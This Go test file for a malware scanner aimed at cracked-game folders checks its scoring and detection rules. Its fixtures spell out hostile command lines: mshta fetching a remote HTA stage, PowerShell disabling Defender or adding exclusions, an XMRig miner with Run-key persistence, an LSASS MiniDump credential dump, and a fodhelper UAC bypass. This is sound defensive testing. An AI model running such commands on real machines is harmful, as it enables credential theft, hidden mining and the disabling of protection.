package scan

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"gamecrack-scanner/internal/known"
	"gamecrack-scanner/internal/model"
)

func TestComputeScoreNeverNegative(t *testing.T) {
	findings := []model.Finding{
		{Rule: "online_virustotal", Category: "reputation", Severity: -10, Detail: "0 malicious / 72 clean"},
	}
	score, verdict, _ := computeScore(findings, nil, false)
	if score < 0 {
		t.Fatalf("score must be clamped >= 0, got %d", score)
	}
	if verdict != model.VerdictClean {
		t.Fatalf("verdict = %s, want CLEAN", verdict)
	}
}

func TestVerifiedUtilitiesStayCleanUnlessTrojanized(t *testing.T) {
	// Genuine Inno Setup uninstaller marker matches UtilityLabel.
	if lbl := known.UtilityLabel(`E:\Games\Demo\unins000.exe`, []string{"Inno Setup Setup Data (6.2.0)"}); lbl == "" {
		t.Fatalf("expected verified Inno Setup utility label")
	}
	// Genuine QuickSFV marker matches UtilityLabel.
	if lbl := known.UtilityLabel(`E:\Games\Demo\_Redist\QuickSFV.EXE`, []string{"QuickSFV v2.36"}); lbl == "" {
		t.Fatalf("expected verified QuickSFV utility label")
	}
	// Random malware named unins000.exe without Inno marker MUST NOT match.
	if lbl := known.UtilityLabel(`E:\Games\Demo\unins000.exe`, []string{"LummaC2 Build", "app_bound_encrypted_key"}); lbl != "" {
		t.Fatalf("fake unins000.exe must not match UtilityLabel, got %q", lbl)
	}

	// Verify QuickSFV with 3/70 VT noise stays CLEAN (cap 12 + VT 15 = 27).
	qsfvFindings := []model.Finding{
		{Rule: "imp_clipboard", Category: "stealer", Severity: 15},
		{Rule: "imp_destructive", Category: "ransomware", Severity: 8},
		{Rule: "base64_blob", Category: "evasion", Severity: 6},
		{Rule: "online_virustotal", Category: "reputation", Severity: 15},
	}
	sc, v, _ := computeScore(qsfvFindings, []string{"RUNTIME_DLL"}, false)
	if v != model.VerdictClean || sc != 27 {
		t.Fatalf("QuickSFV with 3/70 VT noise: score=%d verdict=%s, want 27 CLEAN", sc, v)
	}

	// Verify trojanized QuickSFV carrying a Discord webhook is VETOED by hasIntentFindings.
	badFindings := append(append([]model.Finding{}, qsfvFindings...), model.Finding{
		Rule: "discord_webhook", Category: "c2", Severity: 40,
	})
	if !hasIntentFindings(badFindings) {
		t.Fatalf("trojanized utility MUST trigger hasIntentFindings veto")
	}
}

func TestV2ModernThreatIntelDetection(t *testing.T) {
	cases := []struct {
		name     string
		filename string
		content  string
		wantMin  int
		wantRule string
	}{
		{
			name:     "Chromium App-Bound Encryption + Wallet Stealer",
			filename: "loader.ps1",
			content:  "$k = 'app_bound_encrypted_key'; $m = 'nkbihfbeogaeaoehlefnkodbefgpgknn'; Start-Process -WindowStyle Hidden",
			wantMin:  70,
			wantRule: "stealer_app_bound_enc",
		},
		{
			name:     "LummaC2 family + Defender exclusion",
			filename: "patch.ps1",
			content:  "# LummaC2 Build\nAdd-MpPreference -ExclusionPath C:\\Users\\Public\n",
			wantMin:  70,
			wantRule: "malware_family_ioc",
		},
		{
			name:     "ClickFix LOLBin mshta + Defender disable",
			filename: "fix.cmd",
			content:  "mshta.exe https://cdn.bad-example.invalid/stage.hta\npowershell Set-MpPreference -DisableRealtimeMonitoring $true\n",
			wantMin:  70,
			wantRule: "lolbin_clickfix_dropper",
		},
		{
			name:     "Silent XMRig Miner + Persistence",
			filename: "svc.bat",
			content:  "xmrig.exe --url stratum+tcp://gulf.moneroocean.stream:10128 --donate-level=0 -a rx/0\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Svc /d svc.bat\n",
			wantMin:  70,
			wantRule: "crypto_miner_ioc",
		},
		{
			name:     "Crypto Clipboard Hijacker",
			filename: "clip.py",
			content:  "import pyperclip # clipboard monitor\nbtc = r'^(bc1|[13])[a-km-zA-HJ-NP-Z1-9]{25,34}'\neth = r'^0x[a-fA-F0-9]{40}'\ntrx = r'^T[A-Za-z1-9]{33}'\nStart-Process -WindowStyle Hidden\n",
			wantMin:  70,
			wantRule: "crypto_clipper_ioc",
		},
		{
			name:     "LSASS Credential Dumper + UAC Bypass",
			filename: "dump.ps1",
			content:  "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 dump.dmp full\nfodhelper.exe ms-settings\\Shell\\Open\\command\n",
			wantMin:  70,
			wantRule: "lsass_cred_dump",
		},
	}

	tmp := t.TempDir()
	sc, err := New(Config{Root: tmp, Workers: 1, MaxSizeMB: 16, Quiet: true, FullReadMB: 4})
	if err != nil {
		t.Fatal(err)
	}
	defer sc.Close()

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p := filepath.Join(tmp, tc.filename)
			if err := os.WriteFile(p, []byte(tc.content), 0o644); err != nil {
				t.Fatal(err)
			}
			sum, err := sc.ScanFiles([]string{p})
			if err != nil {
				t.Fatal(err)
			}
			if len(sum.Results) != 1 {
				t.Fatalf("expected 1 result, got %d", len(sum.Results))
			}
			r := sum.Results[0]
			if r.Score < tc.wantMin || r.Verdict != model.VerdictMalicious {
				t.Fatalf("%s: got score=%d verdict=%s findings=%+v, want >=%d MALICIOUS", tc.name, r.Score, r.Verdict, r.Findings, tc.wantMin)
			}
			foundRule := false
			for _, f := range r.Findings {
				if f.Rule == tc.wantRule {
					foundRule = true
					break
				}
			}
			if !foundRule {
				t.Fatalf("%s: expected rule %q in %+v", tc.name, tc.wantRule, r.Findings)
			}
		})
	}
	_ = strings.ToLower
}
